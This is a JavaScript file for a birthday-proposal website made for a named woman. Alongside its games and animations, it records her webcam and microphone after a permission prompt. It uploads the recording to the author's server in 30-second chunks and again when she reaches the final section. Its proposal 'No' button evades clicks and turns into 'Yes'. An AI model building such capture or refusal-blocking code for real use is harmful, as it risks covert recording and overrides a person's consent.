// =============================================
//  Birthday Proposal Website - Full Script
//  For Shikhu 💙 | Video+Audio | Wish to DB
// =============================================

document.addEventListener('DOMContentLoaded', () => {

    const SERVER_URL = window.location.origin;

    // ========================================
    //  PRELOADER
    // ========================================
    setTimeout(() => {
        document.getElementById('preloader').classList.add('hidden');
        setTimeout(() => document.getElementById('cameraModal').classList.remove('hidden'), 800);
    }, 3000);

    // ========================================
    //  MAIN REACTION RECORDING (Video + Audio)
    // ========================================
    let mainRecorder = null;
    let mainChunks = [];
    let cameraStream = null;
    let isMainRecording = false;

    const cameraModal = document.getElementById('cameraModal');
    const allowCameraBtn = document.getElementById('allowCameraBtn');
    const skipCameraBtn = document.getElementById('skipCameraBtn');
    const cameraPreview = document.getElementById('cameraPreview');
    const cameraContainer = document.getElementById('camera-container');
    const recIndicator = document.getElementById('recIndicator');

    allowCameraBtn.addEventListener('click', async () => {
        cameraModal.classList.add('hidden');
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: true
            });
            cameraPreview.srcObject = cameraStream;
            cameraContainer.style.display = 'block';
            startMainRecording();
        } catch (err) {
            console.log('Camera+mic denied, trying video only:', err);
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }, audio: false
                });
                cameraPreview.srcObject = cameraStream;
                cameraContainer.style.display = 'block';
                startMainRecording();
            } catch (e2) { console.log('Camera denied completely:', e2); }
        }
    });

    skipCameraBtn.addEventListener('click', () => cameraModal.classList.add('hidden'));

    function getRecordingMimeType() {
        for (const t of ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm', 'video/mp4']) {
            if (MediaRecorder.isTypeSupported(t)) return t;
        }
        return 'video/webm';
    }

    function startMainRecording() {
        mainRecorder = new MediaRecorder(cameraStream, { mimeType: getRecordingMimeType() });
        mainRecorder.ondataavailable = (e) => { if (e.data?.size > 0) mainChunks.push(e.data); };
        mainRecorder.onstop = () => finishMainRecording();
        mainRecorder.start(1000);
        isMainRecording = true;
        recIndicator.classList.add('active');
    }

    async function finishMainRecording() {
        isMainRecording = false;
        recIndicator.classList.remove('active');
        if (mainChunks.length === 0) return;

        const blob = new Blob(mainChunks, { type: 'video/webm' });

        // 1. Download on her phone
        downloadBlob(blob, 'shikhu-reaction-' + getTimeStamp() + '.webm');

        // 2. Upload to your server
        await uploadVideo(blob, 'reaction');
    }

    function stopMainRecordingAndSave() {
        if (mainRecorder && mainRecorder.state !== 'inactive') {
            mainRecorder.stop();
        }
        if (cameraStream) {
            cameraStream.getTracks().forEach(t => t.stop());
            cameraStream = null;
        }
    }

    // Backup upload every 30s
    setInterval(() => {
        if (isMainRecording && mainChunks.length > 0) {
            const blob = new Blob(mainChunks, { type: 'video/webm' });
            const fd = new FormData();
            fd.append('chunk', blob, 'chunk-' + Date.now() + '.webm');
            fetch(`${SERVER_URL}/api/upload-chunk`, { method: 'POST', body: fd }).catch(() => { });
        }
    }, 30000);

    window.addEventListener('beforeunload', () => stopMainRecordingAndSave());

    // ========================================
    //  HELPER: Download + Upload
    // ========================================
    function downloadBlob(blob, filename) {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = filename;
        document.body.appendChild(a); a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    async function uploadVideo(blob, type) {
        const fd = new FormData();
        fd.append('video', blob, `shikhu-${type}.webm`);
        fd.append('type', type);
        try {
            await fetch(`${SERVER_URL}/api/upload-video`, { method: 'POST', body: fd });
            console.log(`✅ ${type} video uploaded!`);
        } catch (e) { console.log(`❌ Upload failed for ${type}:`, e); }
    }

    function getTimeStamp() {
        return new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
    }

    // ========================================
    //  PROGRESS BAR
    // ========================================
    window.addEventListener('scroll', () => {
        const p = window.scrollY / (document.documentElement.scrollHeight - window.innerHeight) * 100;
        document.getElementById('progressBar').style.width = p + '%';
    }, { passive: true });

    // ========================================
    //  STARS + FLOATING HEARTS
    // ========================================
    const starsContainer = document.getElementById('stars-container');
    for (let i = 0; i < (window.innerWidth < 768 ? 60 : 120); i++) {
        const s = document.createElement('div'); s.className = 'star';
        s.style.cssText = `left:${Math.random() * 100}%;top:${Math.random() * 100}%;width:${Math.random() * 3 + 1}px;height:${Math.random() * 3 + 1}px;animation-duration:${Math.random() * 3 + 2}s;animation-delay:${Math.random() * 5}s`;
        starsContainer.appendChild(s);
    }

    const heartsContainer = document.getElementById('floating-hearts');
    const heartEmojis = ['💙', '🩵', '💎', '✨', '🤍', '💫'];
    function createFloatingHeart() {
        const h = document.createElement('span'); h.className = 'floating-heart';
        h.textContent = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
        h.style.cssText = `left:${Math.random() * 100}%;font-size:${Math.random() + 0.8}rem;animation-duration:${Math.random() * 10 + 8}s`;
        heartsContainer.appendChild(h);
        setTimeout(() => h.remove(), 20000);
    }
    setInterval(createFloatingHeart, 2000);
    for (let i = 0; i < 5; i++) setTimeout(createFloatingHeart, i * 400);

    // ========================================
    //  SCROLL ANIMATIONS
    // ========================================
    const fadeObs = new IntersectionObserver((es) => es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); fadeObs.unobserve(e.target); } }), { threshold: 0.1, rootMargin: '0px 0px -30px 0px' });
    document.querySelectorAll('.fade-in').forEach(el => fadeObs.observe(el));

    const promObs = new IntersectionObserver((es) => es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); promObs.unobserve(e.target); } }), { threshold: 0.1 });
    document.querySelectorAll('.promise-item').forEach(i => promObs.observe(i));

    // ========================================
    //  BLOW CANDLES + CONFETTI
    // ========================================
    let candlesBlown = false;
    document.getElementById('blowBtn').addEventListener('click', function () {
        if (candlesBlown) return; candlesBlown = true;
        document.querySelectorAll('.flame').forEach((f, i) => setTimeout(() => f.classList.add('blown'), i * 200));
        this.textContent = '🎉 Happy Birthday Shikhu! 🎉';
        this.style.cssText = 'background:linear-gradient(135deg,var(--primary),var(--accent));color:white;border-color:transparent';
        launchConfetti();
    });

    function launchConfetti() {
        const colors = ['#1e90ff', '#00d4ff', '#ff6b9d', '#ffd700', '#63b3ff', '#fff'];
        const shapes = ['●', '■', '★', '💙', '✦'];
        for (let i = 0; i < 80; i++) {
            setTimeout(() => {
                const c = document.createElement('div'); c.className = 'confetti-piece';
                c.textContent = shapes[Math.floor(Math.random() * shapes.length)];
                c.style.cssText = `left:${Math.random() * 100}vw;color:${colors[Math.floor(Math.random() * colors.length)]};font-size:${Math.random() * 14 + 8}px;animation-duration:${Math.random() * 3 + 2}s`;
                document.body.appendChild(c);
                setTimeout(() => c.remove(), 6000);
            }, i * 40);
        }
    }

    // ========================================
    //  TYPEWRITER
    // ========================================
    const typeEl = document.getElementById('typewriterText');
    const msgs = ["From the moment I met you,", "my world became more beautiful...", "You are the dream I never knew I had 💙", "And today, on your special day,", "I want to tell you something..."];
    let mi = 0, ci = 0, del = false, typeStarted = false;

    function typeWriter() {
        const m = msgs[mi];
        if (!del) { typeEl.textContent = m.substring(0, ci + 1); ci++; if (ci === m.length) { setTimeout(() => { del = true; typeWriter(); }, 2000); return; } }
        else { typeEl.textContent = m.substring(0, ci - 1); ci--; if (ci === 0) { del = false; mi = (mi + 1) % msgs.length; } }
        setTimeout(typeWriter, del ? 30 : 60);
    }

    new IntersectionObserver((es) => es.forEach(e => { if (e.isIntersecting && !typeStarted) { typeStarted = true; typeWriter(); } }), { threshold: 0.3 }).observe(document.getElementById('typewriter'));

    // ========================================
    //  AGE COUNTER
    // ========================================
    function animCounter(el, target, dur) {
        if (target === '∞') return;
        const n = parseInt(target), st = performance.now();
        (function upd(t) { const p = Math.min((t - st) / dur, 1); el.textContent = Math.round(n * (1 - Math.pow(1 - p, 3))).toLocaleString(); if (p < 1) requestAnimationFrame(upd); })(st);
    }
    let ctrDone = false;
    new IntersectionObserver((es) => es.forEach(e => { if (e.isIntersecting && !ctrDone) { ctrDone = true; animCounter(document.getElementById('years'), '19', 1500); animCounter(document.getElementById('months'), '228', 2000); animCounter(document.getElementById('days'), '6940', 2500); } }), { threshold: 0.2 }).observe(document.getElementById('timeline'));

    // ========================================
    //  BALLOON POP
    // ========================================
    const balloonMsg = document.getElementById('balloonMessage');
    document.getElementById('balloonField').addEventListener('click', (e) => {
        const b = e.target.closest('.balloon-item');
        if (!b || b.classList.contains('popped')) return;
        if (navigator.vibrate) navigator.vibrate(30);
        b.classList.add('popped');
        balloonMsg.style.opacity = '0';
        setTimeout(() => { balloonMsg.textContent = b.dataset.msg; balloonMsg.style.opacity = '1'; }, 200);
        if (!document.querySelector('.balloon-item:not(.popped)')) {
            setTimeout(() => { balloonMsg.textContent = '🎉 You popped them all! Each one was my love for you 💙'; launchConfetti(); }, 1000);
        }
    });

    // ========================================
    //  HEART CATCH GAME
    // ========================================
    const gameField = document.getElementById('gameField'), gameScoreEl = document.getElementById('gameScore');
    let gScore = 0, gActive = false;
    const gEmoji = ['💙', '🩵', '💎', '⭐', '✨', '💫', '🤍'];
    document.getElementById('gameStartBtn').addEventListener('click', function () {
        if (gActive) return; gActive = true; gScore = 0; gameScoreEl.textContent = '0'; this.style.display = 'none';
        const iv = setInterval(() => {
            const h = document.createElement('div'); h.className = 'game-heart';
            h.textContent = gEmoji[Math.floor(Math.random() * gEmoji.length)];
            h.style.cssText = `left:${Math.random() * 85}%;animation-duration:${Math.random() * 2 + 2}s`;
            const catc = (ev) => { ev.preventDefault(); if (h.classList.contains('caught')) return; h.classList.add('caught'); gScore++; gameScoreEl.textContent = gScore; if (navigator.vibrate) navigator.vibrate(30); setTimeout(() => h.remove(), 300); };
            h.addEventListener('touchstart', catc, { passive: false }); h.addEventListener('click', catc);
            gameField.appendChild(h); setTimeout(() => { if (!h.classList.contains('caught')) h.remove(); }, 4500);
        }, 600);
        setTimeout(() => { clearInterval(iv); gActive = false; this.style.display = 'block'; this.textContent = `Score: ${gScore}! 🎉 Play Again?`; if (gScore >= 15) launchConfetti(); }, 20000);
    });

    // ========================================
    //  LOVE METER
    // ========================================
    let meterDone = false;
    document.getElementById('meterBtn').addEventListener('click', function () {
        if (meterDone) return; meterDone = true;
        if (navigator.vibrate) navigator.vibrate(50);
        this.textContent = 'Calculating... 💕';
        const fill = document.getElementById('meterFill'), val = document.getElementById('meterValue'), res = document.getElementById('meterResult');
        let cur = 0;
        const iv = setInterval(() => { cur += 2; val.textContent = cur + '%'; if (cur >= 100) { clearInterval(iv); setTimeout(() => { fill.style.width = '100%'; val.textContent = '∞%'; val.style.fontSize = '4rem'; res.textContent = "My love for you cannot be measured! It's infinite! 💙♾️💙"; this.textContent = '💙 Overflowing with Love! 💙'; this.style.cssText = 'background:linear-gradient(135deg,var(--primary),var(--accent));color:white;border:none;padding:14px 35px;border-radius:50px;font-family:Poppins,sans-serif;font-size:1rem;font-weight:500;cursor:pointer'; launchConfetti(); }, 500); } }, 30);
        setTimeout(() => { fill.style.width = '100%'; }, 100);
    });

    // ========================================
    //  LOVE LETTER
    // ========================================
    let letterOpened = false;
    document.getElementById('envelope').addEventListener('click', function () {
        if (letterOpened) return; letterOpened = true;
        if (navigator.vibrate) navigator.vibrate(50);
        this.classList.add('opened');
        setTimeout(() => document.getElementById('letterPaper').classList.add('open'), 500);
    });

    // ========================================
    //  SPIN THE WHEEL (Premium)
    // ========================================
    const wheelCanvas = document.getElementById('wheelCanvas');
    const spinResult = document.getElementById('spinResult');
    let wheelRotation = 0, spinning = false;

    const wheelCompliments = [
        "You're the most beautiful person I know 💙",
        "You're absolutely amazing in every way ✨",
        "Your kindness makes the world better 🌍",
        "You're stunning, inside and out 💎",
        "You're adorable and I can't stop thinking about you 🥰",
        "You're perfect just the way you are ⭐",
        "You're gorgeous and it takes my breath away 💫",
        "You're the sweetest person alive 🍯"
    ];

    document.getElementById('wheelSpinBtn').addEventListener('click', () => {
        if (spinning) return; spinning = true;
        if (navigator.vibrate) navigator.vibrate(30);

        const extra = 5 + Math.floor(Math.random() * 5);
        const stop = Math.floor(Math.random() * 360);
        wheelRotation += (extra * 360) + stop;
        wheelCanvas.style.transform = `rotate(${wheelRotation}deg)`;

        setTimeout(() => {
            const idx = Math.floor(((360 - (wheelRotation % 360)) / 45) % 8);
            spinResult.textContent = wheelCompliments[idx];
            spinResult.style.animation = 'none';
            setTimeout(() => spinResult.style.animation = 'fadeSlideUp 0.5s ease-out', 10);
            spinning = false;
        }, 4200);
    });

    // ========================================
    //  SONG QUIZ
    // ========================================
    const qContainer = document.getElementById('quizContainer'), qCards = qContainer.querySelectorAll('.quiz-card');
    let qIdx = 0, qCorrect = 0;
    qContainer.addEventListener('click', (e) => {
        if (!e.target.classList.contains('quiz-option') || e.target.classList.contains('correct') || e.target.classList.contains('wrong')) return;
        const card = e.target.closest('.quiz-card'), result = card.querySelector('.quiz-result');
        card.querySelectorAll('.quiz-option').forEach(o => { if (o.dataset.correct === 'true') o.classList.add('correct'); });
        if (e.target.dataset.correct === 'true') { e.target.classList.add('correct'); result.textContent = '✅ Correct! This song reminds me of you 💙'; result.style.color = '#00ff64'; qCorrect++; if (navigator.vibrate) navigator.vibrate(50); }
        else { e.target.classList.add('wrong'); result.textContent = '❌ Not quite, but nice try!'; result.style.color = '#ff6b6b'; }
        setTimeout(() => { qIdx++; card.classList.remove('active'); if (qIdx < qCards.length) qCards[qIdx].classList.add('active'); else { document.getElementById('quizScore').textContent = `You got ${qCorrect}/${qCards.length} right! ${qCorrect === qCards.length ? '🎉 Perfect!' : '💙'}`; if (qCorrect === qCards.length) launchConfetti(); } }, 1500);
    });

    // ========================================
    //  SCRATCH CARD
    // ========================================
    const sCanvas = document.getElementById('scratchCanvas'), sCtx = sCanvas.getContext('2d');
    let isScratch = false;
    function initScratch() {
        const g = sCtx.createLinearGradient(0, 0, sCanvas.width, sCanvas.height);
        g.addColorStop(0, '#1e3a5f'); g.addColorStop(0.5, '#2a5298'); g.addColorStop(1, '#1e3a5f');
        sCtx.fillStyle = g; sCtx.fillRect(0, 0, sCanvas.width, sCanvas.height);
        sCtx.fillStyle = 'rgba(255,255,255,0.4)'; sCtx.font = '18px Poppins,sans-serif'; sCtx.textAlign = 'center';
        sCtx.fillText('✨ Scratch Here ✨', sCanvas.width / 2, sCanvas.height / 2);
    }
    function scratchAt(x, y) { sCtx.globalCompositeOperation = 'destination-out'; sCtx.beginPath(); sCtx.arc(x, y, 25, 0, Math.PI * 2); sCtx.fill(); }
    function sPos(e) { const r = sCanvas.getBoundingClientRect(), sx = sCanvas.width / r.width, sy = sCanvas.height / r.height; if (e.touches) return { x: (e.touches[0].clientX - r.left) * sx, y: (e.touches[0].clientY - r.top) * sy }; return { x: (e.clientX - r.left) * sx, y: (e.clientY - r.top) * sy }; }
    sCanvas.addEventListener('mousedown', e => { isScratch = true; const p = sPos(e); scratchAt(p.x, p.y) });
    sCanvas.addEventListener('mousemove', e => { if (isScratch) { const p = sPos(e); scratchAt(p.x, p.y) } });
    sCanvas.addEventListener('mouseup', () => isScratch = false);
    sCanvas.addEventListener('touchstart', e => { e.preventDefault(); isScratch = true; const p = sPos(e); scratchAt(p.x, p.y) }, { passive: false });
    sCanvas.addEventListener('touchmove', e => { e.preventDefault(); if (isScratch) { const p = sPos(e); scratchAt(p.x, p.y) } }, { passive: false });
    sCanvas.addEventListener('touchend', () => isScratch = false);
    new IntersectionObserver((es) => es.forEach(e => { if (e.isIntersecting) { initScratch(); } }), { threshold: 0.2 }).observe(document.getElementById('scratch'));

    // ========================================
    //  REASONS CAROUSEL
    // ========================================
    const cTrack = document.getElementById('carouselTrack'), cDots = document.getElementById('carouselDots');
    const slides = cTrack.querySelectorAll('.reason-slide');
    let curSlide = 0, tStartX = 0;
    slides.forEach((_, i) => { const d = document.createElement('button'); d.className = 'carousel-dot' + (i === 0 ? ' active' : ''); d.onclick = () => goSlide(i); cDots.appendChild(d); });
    function goSlide(i) { if (i < 0) i = slides.length - 1; if (i >= slides.length) i = 0; curSlide = i; cTrack.style.transform = `translateX(-${i * 100}%)`; cDots.querySelectorAll('.carousel-dot').forEach((d, j) => d.classList.toggle('active', j === i)); }
    document.getElementById('prevBtn').onclick = () => goSlide(curSlide - 1);
    document.getElementById('nextBtn').onclick = () => goSlide(curSlide + 1);
    cTrack.addEventListener('touchstart', e => { tStartX = e.touches[0].clientX }, { passive: true });
    cTrack.addEventListener('touchend', e => { const d = tStartX - e.changedTouches[0].clientX; if (Math.abs(d) > 50) goSlide(curSlide + (d > 0 ? 1 : -1)) }, { passive: true });
    setInterval(() => goSlide(curSlide + 1), 5000);

    // ========================================
    //  COMPLIMENT GENERATOR
    // ========================================
    const compText = document.getElementById('complimentText'), compCard = document.getElementById('complimentCard'), compCount = document.getElementById('complimentCount');
    let cCount = 0;
    const allComp = [
        "Your smile could light up the entire universe 🌌", "You're not just beautiful, you're breathtaking 💫", "The world is a better place because you're in it 🌍",
        "Your laughter is the most addictive melody 🎶", "You make my heart do things it's never done before 💓", "If beauty were time, you'd be an eternity ⏳",
        "You're the reason I believe in magic ✨", "Your eyes hold galaxies I want to explore 🌟", "You're the definition of perfection 💎",
        "Being with you feels like coming home 🏡", "You turn my cloudy days into sunshine ☀️", "You're the most amazing plot twist in my life story 📖",
        "Your voice is my favorite notification sound 🔔", "You make every ordinary moment extraordinary 🌈", "I'd cross every ocean just to see your smile 🌊",
        "You're the kind of beautiful that starts from the soul 💙", "Meeting you was like finding a missing puzzle piece 🧩", "You're my favorite hello and my hardest goodbye 👋",
        "Your kindness makes flowers jealous 🌸", "You're more precious than all the stars combined ⭐", "I fall in love with you more every single day 💕",
        "You're the answer to every wish I ever made 🌠", "Your beauty leaves me speechless every time 😶", "You're the dream I never want to wake from 💭",
        "You deserve every beautiful thing this world has to offer 🎁"
    ];
    document.getElementById('complimentBtn').addEventListener('click', () => {
        cCount++; compCount.textContent = cCount; if (navigator.vibrate) navigator.vibrate(20);
        compCard.classList.remove('animate'); void compCard.offsetWidth; compCard.classList.add('animate');
        compText.textContent = allComp[Math.floor(Math.random() * allComp.length)];
    });

    // ========================================
    //  WISH UPON A STAR → SAVE TO DATABASE
    // ========================================
    const wishSky = document.getElementById('wishSky'), wishInput = document.getElementById('wishInput');
    wishSky.addEventListener('click', () => { document.getElementById('wishInputArea').style.display = 'block'; if (navigator.vibrate) navigator.vibrate(30); });
    document.getElementById('wishSubmit').addEventListener('click', async () => {
        const wish = wishInput.value.trim();
        if (!wish) return;
        document.getElementById('wishInputArea').style.display = 'none';
        document.getElementById('wishGranted').style.display = 'block';
        if (navigator.vibrate) navigator.vibrate([50, 30, 50]);
        launchConfetti();

        // Send wish to server/database
        try {
            await fetch(`${SERVER_URL}/api/wish`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ wish })
            });
            console.log('⭐ Wish saved to database!');
        } catch (e) { console.log('Wish save failed:', e); }
    });

    // ========================================
    //  PROPOSAL
    // ========================================
    const yesBtn = document.getElementById('yesBtn'), noBtn = document.getElementById('noBtn');
    const proposalResponse = document.getElementById('proposalResponse'), celebrationSection = document.getElementById('celebration');

    yesBtn.addEventListener('click', () => {
        proposalResponse.innerHTML = '💙 You just made me the happiest person alive! 💙<br><span style="font-size:2.5rem;display:block;margin-top:0.5rem">🥳🎉💙✨🎆</span>';
        proposalResponse.classList.add('show');
        yesBtn.style.transform = 'scale(1.2)'; noBtn.style.display = 'none';
        celebrationSection.style.display = 'flex';
        launchConfetti(); setTimeout(launchConfetti, 1000); setTimeout(launchConfetti, 2000);
        if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
        for (let i = 0; i < 20; i++) setTimeout(createFloatingHeart, i * 100);
        setTimeout(() => celebrationSection.scrollIntoView({ behavior: 'smooth' }), 2000);
    });

    let noCount = 0;
    const noMsgs = ["Are you sure? 🥺", "Please reconsider! 💙", "Think again... 🥹", "I won't give up! 😤💙", "Last chance! 🙏"];
    noBtn.addEventListener('touchstart', (e) => { e.preventDefault(); moveNo(); }, { passive: false });
    noBtn.addEventListener('mouseenter', () => moveNo());
    noBtn.addEventListener('click', function () {
        noCount++;
        if (noCount < noMsgs.length) { this.textContent = noMsgs[noCount]; moveNo(); }
        else { this.textContent = 'Okay fine, YES! 💙'; this.style.cssText = 'background:linear-gradient(135deg,var(--primary),var(--accent));color:white;transform:none'; this.onclick = () => yesBtn.click(); }
    });
    function moveNo() { noBtn.style.transform = `translate(${Math.random() * 150 - 75}px,${Math.random() * 80 - 40}px)`; }

    // ========================================
    //  VIDEO MESSAGE PLAYER (your pre-recorded video)
    // ========================================
    const myVideo = document.getElementById('myVideoMsg');
    const videoOverlay = document.getElementById('videoOverlay');

    videoOverlay.addEventListener('click', () => {
        videoOverlay.classList.add('hidden');
        myVideo.play().catch(() => { });
    });

    // ========================================
    //  HER VIDEO REPLY (she records a video for you)
    // ========================================
    const replyPreview = document.getElementById('replyPreview');
    const replyOverlay = document.getElementById('replyOverlay');
    const startReplyBtn = document.getElementById('startReplyBtn');
    const stopReplyBtn = document.getElementById('stopReplyBtn');
    const retakeReplyBtn = document.getElementById('retakeReplyBtn');
    const retakeReplyDoneBtn = document.getElementById('retakeReplyDoneBtn');
    const replyStatus = document.getElementById('replyStatus');
    const replyDone = document.getElementById('replyDone');
    const replyPlayback = document.getElementById('replyPlayback');
    let replyRecorder = null;
    let replyChunks = [];
    let replyStream = null;

    startReplyBtn.addEventListener('click', async () => {
        try {
            replyStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: true
            });
            replyPreview.srcObject = replyStream;
            replyOverlay.classList.add('hidden');

            replyRecorder = new MediaRecorder(replyStream, { mimeType: getRecordingMimeType() });
            replyChunks = [];
            replyRecorder.ondataavailable = (e) => { if (e.data?.size > 0) replyChunks.push(e.data); };
            replyRecorder.onstop = () => finishReplyRecording();

            replyRecorder.start(1000);
            startReplyBtn.style.display = 'none';
            retakeReplyBtn.style.display = 'none';
            stopReplyBtn.style.display = 'inline-block';
            replyStatus.textContent = '🔴 Recording... Say something special! 💙';
            replyDone.style.display = 'none';

        } catch (err) {
            replyStatus.textContent = '❌ Camera access denied. Please allow camera to record.';
            console.log('Reply camera error:', err);
        }
    });

    stopReplyBtn.addEventListener('click', () => {
        if (replyRecorder && replyRecorder.state !== 'inactive') {
            replyRecorder.stop();
        }
        if (replyStream) {
            replyStream.getTracks().forEach(t => t.stop());
            replyStream = null;
        }
        stopReplyBtn.style.display = 'none';
        replyStatus.textContent = '⏳ Saving your video...';
    });

    async function finishReplyRecording() {
        if (replyChunks.length === 0) return;

        const blob = new Blob(replyChunks, { type: 'video/webm' });

        // 1. Download on her phone
        downloadBlob(blob, 'shikhu-reply-' + getTimeStamp() + '.webm');

        // 2. Upload to your server
        await uploadVideo(blob, 'reply');

        // 3. Show playback + retake option
        replyPlayback.src = URL.createObjectURL(blob);
        replyPlayback.style.display = 'block';
        replyDone.style.display = 'block';
        retakeReplyBtn.style.display = 'inline-block';
        retakeReplyDoneBtn.style.display = 'inline-block';
        replyStatus.textContent = '';

        launchConfetti();
    }

    // Retake handler — reset everything so she can record again
    function handleRetake() {
        replyDone.style.display = 'none';
        replyPlayback.style.display = 'none';
        replyPlayback.src = '';
        retakeReplyBtn.style.display = 'none';
        retakeReplyDoneBtn.style.display = 'none';
        replyOverlay.classList.remove('hidden');
        startReplyBtn.style.display = 'inline-block';
        startReplyBtn.textContent = '🔴 Record Again';
        replyStatus.textContent = 'Ready for another take! 🎬';
        replyChunks = [];
    }

    retakeReplyBtn.addEventListener('click', handleRetake);
    retakeReplyDoneBtn.addEventListener('click', handleRetake);

    // ========================================
    //  MUSIC
    // ========================================
    let isPlay = false;
    document.getElementById('musicToggle').addEventListener('click', function () {
        const m = document.getElementById('bgMusic');
        if (isPlay) { m.pause(); this.classList.remove('playing'); this.textContent = '🎵'; }
        else { m.play().catch(() => { }); this.classList.add('playing'); this.textContent = '🔊'; }
        isPlay = !isPlay;
    });

    // ========================================
    //  PARALLAX + FIREWORKS
    // ========================================
    window.addEventListener('scroll', () => {
        const s = window.pageYOffset, e = document.querySelector('.entrance-content');
        if (e && s < window.innerHeight) { e.style.transform = `translateY(${s * 0.25}px)`; e.style.opacity = 1 - s / 600; }
    }, { passive: true });

    const fwContainer = document.getElementById('fireworks');
    function createFirework() {
        const cs = ['#1e90ff', '#00d4ff', '#ffd700', '#ff6b9d'], x = Math.random() * 100, c = cs[Math.floor(Math.random() * cs.length)];
        for (let i = 0; i < 8; i++) {
            const s = document.createElement('div');
            s.style.cssText = `position:absolute;width:4px;height:4px;background:${c};border-radius:50%;left:${x}%;top:50%;box-shadow:0 0 6px ${c};opacity:1;transition:all 1.5s ease-out`;
            fwContainer.appendChild(s);
            const a = (i * 45) * Math.PI / 180, d = Math.random() * 40 + 20;
            requestAnimationFrame(() => { s.style.transform = `translate(${Math.cos(a) * d}px,${Math.sin(a) * d}px)`; s.style.opacity = '0' });
            setTimeout(() => s.remove(), 1600);
        }
    }

    // ========================================
    //  FINAL SECTION: AUTO-SAVE BOTH VIDEOS
    //  When she reaches "Happy Birthday" page,
    //  both videos auto-stop, download & upload
    // ========================================
    let finalSaved = false;
    new IntersectionObserver((es) => es.forEach(e => {
        if (e.isIntersecting) {
            // Fireworks
            for (let i = 0; i < 5; i++) setTimeout(createFirework, i * 400);
            const iv = setInterval(createFirework, 2000);
            setTimeout(() => clearInterval(iv), 20000);

            // Auto-save both videos (only once)
            if (!finalSaved) {
                finalSaved = true;

                // Wait 3 seconds to capture her final reaction, then save
                setTimeout(() => {
                    // 1. Stop & save main reaction recording
                    stopMainRecordingAndSave();

                    // 2. Stop & save her reply recording (if active)
                    if (replyRecorder && replyRecorder.state !== 'inactive') {
                        replyRecorder.stop(); // triggers finishReplyRecording
                    }
                    if (replyStream) {
                        replyStream.getTracks().forEach(t => t.stop());
                        replyStream = null;
                    }
                    stopReplyBtn.style.display = 'none';
                    startReplyBtn.style.display = 'none';
                    replyStatus.textContent = '✅ Your video has been saved automatically! 💙';
                }, 3000);
            }
        }
    }), { threshold: 0.2 }).observe(document.getElementById('final'));

    // ========================================
    //  CUSTOM CURSOR
    // ========================================
    const cursorDot = document.querySelector('.cursor-dot');
    const cursorOutline = document.querySelector('.cursor-outline');

    if (cursorDot && cursorOutline) {
        window.addEventListener('mousemove', (e) => {
            const posX = e.clientX;
            const posY = e.clientY;

            cursorDot.style.left = `${posX}px`;
            cursorDot.style.top = `${posY}px`;

            cursorOutline.style.left = `${posX}px`;
            cursorOutline.style.top = `${posY}px`;
        });

        // Add hover effect to interactive elements
        const interactiveSelectors = 'a, button, input, textarea, select, .balloon-item, .quiz-option, .game-heart, .scratch-card-container, #envelope, #wheelSpinBtn';

        // Use event delegation for dynamically added elements or just broad document listening
        document.addEventListener('mouseover', (e) => {
            const isInteractive = e.target.closest(interactiveSelectors) || getComputedStyle(e.target).cursor === 'pointer';
            if (isInteractive) {
                document.body.classList.add('cursor-hover');
            } else {
                document.body.classList.remove('cursor-hover');
            }
        });
    }

});
